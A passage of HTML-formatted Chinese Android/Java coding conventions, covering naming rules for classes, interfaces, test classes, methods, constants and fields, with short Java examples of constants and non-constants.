lang="zh-CN">&#25171;&#21360;&#24037;&#20855;&#31867;&#65306;</span></font></font><font size="3" style="font-size: 12pt">PrinterUtil</font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25968;&#25454;&#24211;&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20197;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">DBHelper</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#26032;&#38395;&#25968;&#25454;&#24211;&#65306;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">NewDBHelper</font></font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Service</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20197;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Service</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#26102;&#38388;&#26381;&#21153;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">TimeServiceBroadcast</font></font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Receiver</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20197;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Receiver</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25512;&#36865;&#25509;&#25910;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">JPushReceiver</font></font></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">ContentProvider</font></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20197;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Provider</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21518;&#32512;&#26631;&#35782;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left"><br/></p></td></tr><tr><td width="120" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#33258;&#23450;&#20041;&#30340;&#20849;&#20139;&#22522;&#30784;&#31867;</font></span></font></p></td><td width="225" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20197;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">Base</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24320;&#22836;</font></span></font></p></td><td width="208" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">BaseActivity,BaseFragment</font></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27979;&#35797;&#31867;&#30340;&#21629;&#21517;&#20197;&#23427;&#35201;&#27979;&#35797;&#30340;&#31867;&#30340;&#21517;&#31216;&#24320;&#22987;&#65292;&#20197;</span></font></font><font size="3" style="font-size: 12pt">Test</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32467;&#26463;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt">HashTest</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">HashIntegrationTest</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25509;&#21475;&#65288;</span></font></font><font size="3" style="font-size: 12pt">interface</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65289;&#65306;&#21629;&#21517;&#35268;&#21017;&#19982;&#31867;&#19968;&#26679;&#37319;&#29992;&#22823;&#39548;&#23792;&#21629;&#21517;&#27861;&#65292;&#22810;&#20197;</span></font></font><font size="3" style="font-size: 12pt">able</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;</span></font></font><font size="3" style="font-size: 12pt">ible</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#32467;&#23614;&#65292;&#22914;</span></font></font><font size="3" style="font-size: 12pt"><br>interfaceRunnable ;<br>interface Accessible</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27880;&#24847;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif"><br></font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#39033;&#30446;&#37319;&#29992;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">MVP</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#25152;&#26377;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Model</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">View</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12289;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Presenter</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#30340;&#25509;&#21475;&#37117;&#20197;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">I</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20026;&#21069;&#32512;&#65292;&#19981;&#21152;&#21518;&#32512;&#65292;&#20854;&#20182;&#30340;&#25509;&#21475;&#37319;&#29992;&#19978;&#36848;&#21629;&#21517;&#35268;&#21017;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1344919360"></a>5.2.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#26041;&#27861;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26041;&#27861;&#21517;&#37117;&#20197;</span></font></font><font size="3" style="font-size: 12pt">LowerCamelCase</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#32534;&#20889;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26041;&#27861;&#21517;&#36890;&#24120;&#26159;&#21160;&#35789;&#25110;&#21160;&#35789;&#30701;&#35821;&#12290;</span></font></font></p><table width="560" cellpadding="1" cellspacing="0"><col width="144"><col width="412"><thead><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#26041;&#27861;</b></font></span></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="center" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt"><b>&#35828;&#26126;</b></font></span></font></p></td></tr></thead><tbody><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">initXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21021;&#22987;&#21270;&#30456;&#20851;&#26041;&#27861;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">,</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">init</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21069;&#32512;&#26631;&#35782;&#65292;&#22914;&#21021;&#22987;&#21270;&#24067;&#23616;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">initView()</font></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">isXX()checkXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#26041;&#27861;&#36820;&#22238;&#20540;&#20026;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">boolean</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#22411;&#30340;&#35831;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">is</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#25110;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">check</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">getXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#36820;&#22238;&#26576;&#20010;&#20540;&#30340;&#26041;&#27861;&#65292;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">get</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">handleXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#23545;&#25968;&#25454;&#36827;&#34892;&#22788;&#29702;&#30340;&#26041;&#27861;&#65292;&#23613;&#37327;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">handle</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">displayXX()/showXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#24377;&#20986;&#25552;&#31034;&#26694;&#21644;&#25552;&#31034;&#20449;&#24687;&#65292;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">display/show</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">saveXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#19982;&#20445;&#23384;&#25968;&#25454;&#30456;&#20851;&#30340;&#65292;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">save</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#20026;&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">resetXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#23545;&#25968;&#25454;&#37325;&#32452;&#30340;&#65292;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">reset</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">clearXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#28165;&#38500;&#25968;&#25454;&#30456;&#20851;&#30340;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">removeXXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#28165;&#38500;&#25968;&#25454;&#30456;&#20851;&#30340;</font></span></font></p></td></tr><tr><td width="144" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">drawXXX()</font></font></p></td><td width="412" style="border: none; padding: 0in"><p class="western" align="left" style="widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#32472;&#21046;&#25968;&#25454;&#25110;&#25928;&#26524;&#30456;&#20851;&#30340;&#65292;&#20351;&#29992;</font></span></font><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">draw</font></font><font face="&#23435;&#20307;"><span lang="zh-CN"><font size="3" style="font-size: 12pt">&#21069;&#32512;&#26631;&#35782;</font></span></font></p></td></tr></tbody></table><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19979;&#21010;&#32447;&#21487;&#33021;&#20986;&#29616;&#22312;</span></font></font><font size="3" style="font-size: 12pt">JUnit</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27979;&#35797;&#26041;&#27861;&#21517;&#31216;&#20013;&#29992;&#20197;&#20998;&#38548;&#21517;&#31216;&#30340;&#36923;&#36753;&#32452;&#20214;&#12290;&#19968;&#20010;&#20856;&#22411;&#30340;&#27169;&#24335;&#26159;&#65306;</span></font></font><font size="3" style="font-size: 12pt">test_</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#20363;&#22914;</span></font></font><font size="3" style="font-size: 12pt">testPop_emptyStack</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24182;&#19981;&#23384;&#22312;&#21807;&#19968;&#27491;&#30830;&#30340;&#26041;&#24335;&#26469;&#21629;&#21517;&#27979;&#35797;&#26041;&#27861;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1592820749"></a>5.2.4 <font face="&#23435;&#20307;"><span lang="zh-CN">&#24120;&#37327;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24120;&#37327;&#21517;&#21629;&#21517;&#27169;&#24335;&#20026;</span></font></font><font size="3" style="font-size: 12pt">CONSTANT_CASE</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#20840;&#37096;&#23383;&#27597;&#22823;&#20889;&#65292;&#29992;&#19979;&#21010;&#32447;&#20998;&#38548;&#21333;&#35789;&#12290;&#37027;&#65292;&#21040;&#24213;&#20160;&#20040;&#31639;&#26159;&#19968;&#20010;&#24120;&#37327;&#65311;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#20010;&#24120;&#37327;&#37117;&#26159;&#19968;&#20010;&#38745;&#24577;</span></font></font><font size="3" style="font-size: 12pt">final</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#27573;&#65292;&#20294;&#19981;&#26159;&#25152;&#26377;&#38745;&#24577;</span></font></font><font size="3" style="font-size: 12pt">final</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#27573;&#37117;&#26159;&#24120;&#37327;&#12290;&#22312;&#20915;&#23450;&#19968;&#20010;&#23383;&#27573;&#26159;&#21542;&#26159;&#19968;&#20010;&#24120;&#37327;&#26102;&#65292;&#32771;&#34385;&#23427;&#26159;&#21542;&#30495;&#30340;&#24863;&#35273;&#20687;&#26159;&#19968;&#20010;&#24120;&#37327;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65292;&#22914;&#26524;&#20219;&#20309;&#19968;&#20010;&#35813;&#23454;&#20363;&#30340;&#35266;&#27979;&#29366;&#24577;&#26159;&#21487;&#21464;&#30340;&#65292;&#21017;&#23427;&#20960;&#20046;&#32943;&#23450;&#19981;&#20250;&#26159;&#19968;&#20010;&#24120;&#37327;&#12290;&#21482;&#26159;&#27704;&#36828;&#19981;&#25171;&#31639;&#25913;&#21464;&#23545;&#35937;&#19968;&#33324;&#26159;&#19981;&#22815;&#30340;&#65292;&#23427;&#35201;&#30495;&#30340;&#19968;&#30452;&#19981;&#21464;&#25165;&#33021;&#23558;&#23427;&#31034;&#20026;&#24120;&#37327;&#12290;</span></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">//Constantsstatic<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>int<font face="Courier New, serif"><font size="2" style="font-size: 10pt">NUMBER = </font></font>5<font face="Courier New, serif"><font size="2" style="font-size: 10pt">;<br></font></font>static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">ImmutableListNAMES = ImmutableList.of(</font></font>&quot;Ed&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>&quot;Ann&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">);</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">Joiner COMMA_JOINER = Joiner.on(</font></font>','<font face="Courier New, serif"><font size="2" style="font-size: 10pt">);</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"> <font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">//because Joiner is immutable</font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">SomeMutableType[] EMPTY_ARRAY = {};</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">enum<font face="Courier New, serif"><font size="2" style="font-size: 10pt">SomeEnum { ENUM_CONSTANT }</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">//Not constantsstatic<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt"><font face="Courier New, serif"><font size="2" style="font-size: 10pt">StringnonFinal = </font></font>&quot;non-final&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">;</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">String nonStatic = </font></font>&quot;non-static&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">;</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">SetmutableCollection = </font></font>new<font face="Courier New, serif"><font size="2" style="font-size: 10pt">HashSet();</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">ImmutableSetmutableElements = ImmutableSet.of(mutable);</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">Logger logger = Logger.getLogger(MyClass.getName());</font></font></font></font></p><p align="left" style="margin-bottom: 0in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;, serif"><font size="3" style="font-size: 12pt">static<font face="Courier New, serif"><font size="2" style="font-size: 10pt"></font></font>final<font face="Courier New, serif"><font size="2" style="font-size: 10pt">String[] nonEmptyArray = {</font></font>&quot;these&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>&quot;can&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">,</font></font>&quot;change&quot;<font face="Courier New, serif"><font size="2" style="font-size: 10pt">};</font></font></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#20123;&#21517;&#23383;&#36890;&#24120;&#26159;&#21517;&#35789;&#25110;&#21517;&#35789;&#30701;&#35821;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1976759172"></a>5.2.5 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;&#24120;&#37327;&#23383;&#27573;&#21517;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38750;&#24120;&#37327;&#23383;&#27573;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">LowerCamelCase</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;&#30340;&#22522;&#30784;&#19978;&#25913;&#36896;&#20026;&#22914;&#19979;&#39118;&#26684;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22522;&#26412;&#32467;&#26500;&#20026;</span></font></font><font size="3" style="font-size: 12pt">scopeVariableNameType</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;</span></font></font><font size="3" style="font-size: 12pt"><br><b>scope</b></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN"><b>&#65306;&#33539;&#22260;</b></span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38750;&#20844;&#26377;&#65292;&#38750;&#38745;&#24577;&#23383;&#27573;&#21629;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">m</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24320;&#22836;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#38745;&#24577;&#23383;&#27573;&#21629;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">s</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24320;&#22836;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20844;&#26377;&#38750;&#38745;&#24577;&#23383;&#27573;&#21629;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">p</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24320;&#22836;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20844;&#26377;&#38745;&#24577;&#23383;&#27573;&#65288;&#20840;&#23616;&#21464;&#37327;&#65289;&#21629;&#21517;&#20197;</span></font></font><font size="3" style="font-size: 12pt">g</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24320;&#22836;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br>publicstatic final 